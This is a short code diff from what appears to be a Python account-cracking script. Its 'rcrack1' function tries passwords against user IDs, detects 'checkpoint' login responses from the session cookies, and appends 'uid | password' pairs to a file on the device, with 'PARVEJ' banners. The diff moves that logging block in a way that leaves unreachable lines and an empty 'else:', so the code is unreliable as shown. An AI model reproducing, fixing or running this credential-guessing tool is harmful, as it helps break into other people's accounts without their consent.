@@ -285,6 +285,12 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
+                print(f"\x1b[38;5;196m[PARVEJ-CP❌] {uid}|{ps}")
+                open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
                 try:
                     uid=lo['uid']
                 except:
@@ -293,12 +299,6 @@ def rcrack1(uid,pwx,tl):
                 if ckkx=='LOCK':
                     return
                 else:
-                print(f"\x1b[38;5;196m[PARVEJ-CP❌] {uid}|{ps}")
-                open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
-                break
-            else:
-                continue
         loop+=1
         sys.stdout.write(f'\r\033[m[PARVEJ-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
